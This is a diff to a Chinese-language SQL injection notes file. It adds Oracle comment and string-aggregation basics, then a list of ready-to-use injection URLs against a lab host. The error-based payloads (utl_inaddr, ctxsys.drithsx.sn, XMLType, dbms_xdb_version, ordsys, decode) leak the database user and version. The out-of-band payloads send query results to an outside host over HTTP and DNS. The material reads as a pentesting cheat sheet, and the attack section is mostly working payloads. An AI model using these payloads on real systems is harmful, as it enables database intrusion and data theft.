@@ -26,7 +26,7 @@
 
 ---
 
-#### 字符串拼接
+### 字符串拼接
 
 1. 以空格隔开字符串（但是这样不能拼接函数）
 
@@ -96,23 +96,114 @@
 
 ## oracle
 
-- 注释
-    - 单行注释
+### 基础
 
-    ```sql
-    -- select 1 from dual;
-    ```
+- 单行注释
 
-    - 多行注释
+	```sql
+	-- select 1 from dual;
+	```
 
-    ```sql
-    /*
-    select 1 from dual;
-    select 2 from dual;
-    */
-    ```
+- 多行注释
+
+	```sql
+	/*
+	select 1 from dual;
+	select 2 from dual;
+	*/
+	```
+
+- 拼接行（不能太长）
+
+	```sql
+	select wmsys.wm_concat(t.column) from tableName t; # 10g后默认不支持
+
+	select listagg(table_name, ',') within group (order by table_name) from user_tables where rownum < 10;
+	```
+	
+
+### 报错注入
+
+对一些返回报错信息但又不会返回查询结果的漏洞，可尝试“报错注入”
+
+- utl_inaddr.get_host_name()进行报错注入
+
+	```
+	http://10.10.10.110:8080/SqlInjection/selcet?suser=1&sname=1' and 1=utl_inaddr.get_host_name((select user from dual))--
+	```
+
+- 使用ctxsys.drithsx.sn()进行报错注入
+
+	```
+	http://10.10.10.110:8080/SqlInjection/selcet?suser=1&sname=1' and 1=ctxsys.drithsx.sn(1,(select user from dual))--
+	```
+
+- 使用XMLType()进行报错注入
+
+	```
+	http://10.10.10.110:8080/SqlInjection/selcet?suser=1&sname=1' and (select upper(XMLType(chr(60)||chr(58)||(select user from dual)||chr(62))) from dual) is not null--
+	```
+
+- 使用dbms_xdb_version.checkin()进行报错注入
+
+	```
+	http://10.10.10.110:8080/SqlInjection/selcet?suser=1&sname=1' and (select dbms_xdb_version.checkin((select user from dual)) from dual) is not null--
+	```
+
+- 使用dbms_xdb_version.makeversioned()进报错注入
+
+	```
+	http://10.10.10.110:8080/SqlInjection/selcet?suser=1&sname=1' and (select dbms_xdb_version.makeversioned((select user from dual)) from dual) is not null--
+	```
+
+- 使用dbms_xdb_version.uncheckout()进行报错注入
+
+	```
+	http://10.10.10.110:8080/SqlInjection/selcet?suser=1&sname=1' and (select dbms_xdb_version.uncheckout((select user from dual)) from dual) is not null--
+	```
+
+- 使用dbms_utility.sqlid_to_sqlhash()进行报错注入
+
+	```
+	http://10.10.10.110:8080/SqlInjection/selcet?suser=1&sname=1' and (SELECT dbms_utility.sqlid_to_sqlhash((select user from dual)) from dual) is not null--
+	```
+
+- 使用ordsys.ord_dicom.getmappingxpath()进行报错注入
+
+	```
+	http://10.10.10.110:8080/SqlInjection/selcet?suser=1&sname=1'  and 1=ordsys.ord_dicom.getmappingxpath((select user from dual),user,user)--
+
+	http://10.10.10.110:8080/SqlInjection/selcet?suser=1&sname=1'  and 1=ordsys.ord_dicom.getmappingxpath((select banner from v$version where rownum=1),user,user)--
+	```
+
+- 使用decode进行报错注入，这种方式更偏向布尔型注入，因为这种方式并不会通过报错把查询结果回显回来，仅是用来作为页面的表现不同的判断方法
+
+	```
+	http://10.10.10.110:8080/SqlInjection/selcet?suser=1&sname=1'and 1=(select decode(substr(user,1,1),'S',(1/0),0) from dual) --
+	```
+
+### 外带通信
+
+- utl_http.request()
+
+	```
+	http://10.10.10.110:8080/SqlInjection/selcet?suser=1&sname=1' or 1=utl_http.request('http://10.10.10.1:80/'||(select banner from sys.v_$version where rownum=1)) --
+	```
+
+- utl_inaddr.get_host_address()
+
+	```
+	http://10.10.10.110:8080/SqlInjection/selcet?suser=1&sname=1' and (select utl_inaddr.get_host_address((select user from dual)||'.t4inking.win') from dual)is not null--
+	```
 
 ## mssql
 
 
 ## mongodb
+
+
+## 参考
+
+> [少年，这是我特意为你酿制的Oracle 注入，干了吧！](https://bbs.ichunqiu.com/thread-26734-1-1.html)
+>
+
